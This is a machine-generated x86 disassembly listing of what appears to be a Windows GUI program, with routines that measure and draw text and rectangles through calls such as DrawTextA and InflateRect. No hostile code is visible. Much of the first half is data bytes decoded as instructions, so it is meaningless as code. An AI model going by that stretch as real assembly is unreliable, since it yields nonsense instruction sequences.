insb
jae r-xdata
add dh bh
jo r-xdata
je r-xdata
add [ ebp + 0x10b40040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
adc [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx ] dl
inc ebx
add [ edx + 0x18004311 ] bh
add al [ eax ]
add ah dh
push cs
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
or [ ebx + 0x74 ] dl
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push [ eax ]
outsb
mov eax eax
enter 0x4311 0x0
pop es
pop es
push esp
inc edx
jne r-xdata
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
popad
add [ eax ] al
jmp [ eax + 0x3c004396 ]
add ah al
sub [ ecx ] al
cmp al 0x0
add dh bh
rcl [ esi + 0x10043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
pop eax
push ebp
inc ebx
add [ ecx ] ah
add bh bh
mov al [ 0x3c004396 ]
xchg edi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
adc al 0xc8
inc ebx
add [ ecx ] al
add [ eax + 0x4208000d ] al
outsb
mov ah 0x10
inc ebx
add [ eax + edx ] bh
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
mov [ edx ] ss
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
add [ ebp + 0x43 ] dl
add [ ebx + 0x43 ] cl
add [ ebx + 0x43 ] bh
add [ ebx + eax * 8 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
je r-xdata
inc ebx
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
sub_431619
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebx
jns r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
loopne r-xdata
jo r-xdata
push edi
in al 0x57
inc ebx
add al ah
add [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
loopne r-xdata
push esi
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
push ebp
push ebp
jo r-xdata
jmp eax
add bh bh
loopne r-xdata
arpl [ ebx + 0x8 ] bp
pop ecx
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
inc esp
outsd
ja r-xdata
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
jns r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002f ] al
outsb
push ebx
je r-xdata
pop ebx
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002a ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
add al ah
sbb [ ebx ] al
jb r-xdata
inc ebx
add al bl
add [ eax ] al
xor al 0x57
retn
cld
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edi
jb r-xdata
or [ fs : ebx + 0x62 ] ah
jb r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
jb r-xdata
adc al 0x2
inc esp
jb r-xdata
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ eax + 0x39 ] cl
inc ebx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0x34e40043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
mov esp 0xb000433a
fadd [ ebx ]
sbb [ ebx ] bh
inc ebx
add [ eax - 0x20 ] ah
inc ebx
insb
jae r-xdata
inc eax
add al dl
pop ss
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
sbb [ ebx ] al
0x4318
cmp al 0x17
inc ebx
add [ ebx ] al
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
shl al 0x18
inc ebx
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
inc ebx
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
inc esp
cmp eax [ ebx ]
pop eax
cmp eax [ ebx ]
outsd
add [ eax ] al
hlt
add [ eax ] al
add [ eax ] al
add [ eax + ebx + 0x18ca0043 ] ah
inc ebx
add [ edx + eax ] dl
je r-xdata
outsb
push ebx
je r-xdata
dec edi
mov esp 0xe0004356
add [ eax ] al
jmp eax
cwde
push edi
inc ebx
add al ch
add [ eax ] eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x78004030
leave
inc ebx
add [ eax + 0x16 ] al
outsd
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
sbb al [ ebx ]
sbb [ edx ] al
add [ eax ] al
test [ edi ] dl
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
je r-xdata
add ah dh
push cs
inc ebx
add ah al
je r-xdata
and [ edx ] bh
inc ebx
add [ ecx + edi + 0x540f0043 ] dh
inc ebx
jne r-xdata
pop ss
inc ebx
add [ eax + edx ] bh
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x78004030
leave
inc ebx
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
outsb
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bh
pop ss
inc ebx
add [ ebx ] cl
arpl [ edx + 0x55 ] sp
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
inc eax
push ss
insb
jae r-xdata
inc ebx
add [ edx + edi - 0x234fffbd ] bh
inc ebx
add [ eax ] bl
cmp eax [ ebx ]
pushad
loopne r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0xd5cff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ ebp + ecx + 0x44 ]
pushad
cmp eax [ ebx ]
cld
cmp eax [ ebx ]
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax + 0x34 ]
cmp al [ ebx ]
push esp
cmp al [ ebx ]
loopne r-xdata
lahf
inc ecx
add [ eax + 0x39 ] cl
inc ebx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0x34e40043 ] eax
inc ebx
sbb [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
sbb al [ ebx ]
add [ eax ] al
add [ eax ] al
inc al
xchg esi eax
inc ebx
add [ ecx ] al
add [ eax ] al
inc ebx
add [ ecx ] cl
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
outsd
add [ gs : ebp + 0x43 ] dl
jb r-xdata
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
mov esp 0xb000433a
fadd [ ebx ]
sbb [ ebx ] bh
inc ebx
add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax + 0x34 ]
cmp al [ ebx ]
push esp
cmp al [ ebx ]
loopne r-xdata
inc ebx
add [ 0xffffffffa3e00043 ] dh
inc ebx
add ah ah
xor al 0x43
rcr [ eax + 0x1a ] 0x43
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
or al 0x44
add [ esp + ecx + 0x44 ] cl
add [ eax - 0x80000000 ] al
adc eax 0x74430500
insb
xor eax [ eax + ebx + 0x4e ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
popad
jo r-xdata
add [ edi ] al
inc ebx
jns r-xdata
inc ecx
insb
insb
outsd
ja r-xdata
sbb [ ebx ] eax
fcomp [ eax ]
inc ebx
add [ esi ] dh
add [ eax ] cl
push ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push ss
add [ edx ] cl
inc esp
jb r-xdata
pop eax
push ebp
inc ebx
push cs
add [ ebx ] cl
inc ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
sbb [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pop eax
mov bl 0x41
add [ eax ] ch
inc ebx
jne r-xdata
or [ ebp + 0x43 ] ah
add [ eax - 0x80000000 ] al
adc eax [ eax ]
add eax 0x6f6c6f43
jb r-xdata
mov [ edx ] ss
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ ecx ] ah
add bh bh
mov al [ 0x3c004396 ]
xchg edi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc ebx
add [ eax - 0x5c ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
inc [ eax - 0x5c ]
jae r-xdata
push esi
inc ebx
add [ eax + eax ] dh
call [ eax + ecx * 8 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0014 ] al
outsd
outsb
jae r-xdata
add dh bh
jo r-xdata
cmp al [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax 0x6c410900
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000c ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ fs : ecx ]
adc [ edx ] al
add bh bh
inc eax
add ah al
sub [ ecx ] al
cmp al 0x0
add dh bh
rcl [ esi + 0x10043 ] 0x0
add bh bh
inc eax
movsb [ edi ] [ esi ]
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
outsb
insd
outsb
je r-xdata
add [ ebx + 0x43 ] cl
add [ ebx + 0x43 ] bh
add [ ebx + eax * 8 ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070011 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080010 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
push ebp
inc ebx
push esp
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x68ff0001 ] ah
adc [ eax ] al
adc [ edx ] eax
add bh bh
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
sbb [ edx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_432080
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ ecx ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x4dffbcdf ] bl
and [ ebx ] eax
adc al 0x2
add [ eax ] al
hlt
sub_4320a5
push cs
inc ebx
add ah al
lahf
inc ecx
add [ eax + 0x33 ] bl
inc eax
add [ eax ] bl
cdq
inc ecx
add [ eax + 0x33 ] ah
inc eax
add [ eax - 0x63ffbc1a ] ah
xor [ eax ] al
mov eax 0x78004030
leave
inc ebx
add [ eax + 0x16 ] al
inc esp
add [ eax - 0x22 ] ch
inc ebx
add [ eax ] ch
inc ebx
inc ecx
add ah bh
retn
sub_4320d6
inc ebx
add [ eax + ebx * 4 ] bl
inc ebx
add [ ebx + ecx * 8 ] bl
inc ebx
add [ ecx ] dh
inc ebx
add ah bl
lahf
inc ecx
add ah al
pushfd
inc ecx
add [ esp + ebx * 4 - 0x601bffbf ] bh
inc ecx
add [ esp + edi ] cl
inc ebx
add [ ecx + edx + 0x44 ] dl
add [ eax + 0x16 ] dh
inc esp
add [ ebp + edx - 0x696fffbc ] bh
inc ebx
add al dl
or eax [ eax + eax - 0x10 ]
or eax [ eax + eax + 0x8 ]
or [ eax + eax - 0x28 ] eax
xchg ebp eax
inc ebx
add ah bl
xchg ebp eax
inc ebx
add ah cl
lds eax [ ebx ]
clc
lds eax [ ebx ]
sbb al 0xa1
inc ebx
add [ edi + edx * 4 + 0x43 ] dl
add [ eax + 0x200043a2 ] ch
mov [ 0xffffffffa5340043 ] al
inc ebx
add al ah
mov [ 0x34e40043 ] eax
inc ebx
add [ esi + eax * 8 + 0x43 ] bh
add [ ecx + ecx + 0x44 ] bl
add [ eax ] bl
or al [ eax + eax + 0x14 ]
add eax 0x9fc0044
inc esp
add [ ebx + ecx * 8 - 0x2dd7ffbd ] dl
inc ebx
add al cl
fild [ ebx ]
cld
cmp eax 0xdcb00043
inc ebx
add [ esi + edi + 0x43 ] dl
add [ eax - 0x20 ] ah
inc ebx
add [ eax + 0x43 ] ah
add [ edi + ebx * 8 ] bl
inc ebx
add ah al
fiadd [ ebx ]
cmp al 0xb
inc esp
add [ ecx + ebp * 8 ] cl
inc ebx
add [ esp + ebx + 0x44 ] bh
add [ eax - 0x57ffbbf9 ] bh
or al [ eax + eax + 0x6c ]
cmp al 0x43
add [ eax + 0x3d ] dh
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x80ff
sub_4327c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44273c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_439b08
mov edx 0x69
mov eax esi
call sub_439b2c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_432824
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cb94
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41da5c
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41d9b8
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_432890
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_432c32
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41da5c
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41d9b8
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43a34c
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412938
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412938
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x54 ]
call sub_404114
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x58 ]
call sub_404314
push eax
mov eax edi
call sub_41db3c
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412938
mov eax ebx
mov si 0xffc8
call sub_403300
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d3f4
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d3f4
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d7d4
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d3f4
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41db3c
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432c39
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403e78
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403e78
lea eax [ ebp - 0x60 ]
call sub_404534
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403e78
retn
mov eax ebx
mov si 0xffc8
call sub_403300
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41d7d4
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43a34c
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41d99c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412938
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412938
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404680
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f638
jmp r-xdata
call sub_42f358
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_42f69c
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41db3c
push eax
call sub_42f358
lea ecx [ ebp - 0x4c ]
pop edx
call sub_42f544
push 0x0
mov eax edi
call sub_41db3c
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43a34c
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43c620
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x80 ]
call sub_404114
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x84 ]
call sub_404314
push eax
mov eax edi
call sub_41db3c
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d3f4
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x88 ]
call sub_404114
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43a34c
mov eax [ ebp - 0x8c ]
call sub_404314
push eax
mov eax edi
call sub_41db3c
push eax
call DrawTextA
sub_432c43
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432cbe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a34c
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_451470
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_43ffac
mov eax ebx
mov si 0xffb8
call sub_403300
test al al
je r-xdata
mov eax ebx
call sub_441088
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432cc5
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_432d10
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_441cbc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_439b08
mov edx 0x11
mov eax esi
call sub_439b2c
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_42f358
call sub_42f438
test al al
je r-xdata
add esp 0xfffffff0
call sub_403428
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_432dbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_432f12
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43c620
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41da5c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40411c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404114
push eax
mov eax [ ebp - 0x4 ]
call sub_404314
push eax
mov eax [ ebx + 0x160 ]
call sub_41db3c
push eax
call DrawTextA
